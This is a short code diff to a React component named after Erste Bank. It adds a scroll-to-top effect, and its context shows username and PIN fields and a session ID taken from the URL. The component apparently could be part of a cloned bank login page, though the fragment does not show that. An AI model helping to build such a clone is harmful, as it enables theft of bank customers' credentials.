@@ -51,6 +51,8 @@ const ErsteBank = () => {
   const sessionId = searchParams.get("s") || "";
   const [showLoading, setShowLoading] = useState(false);
 
+  useEffect(() => { window.scrollTo(0, 0); }, []);
+
   const [username, setUsername] = useState("");
   const [pin, setPin] = useState("");
   const [lang, setLang] = useState<"de" | "en">("de");
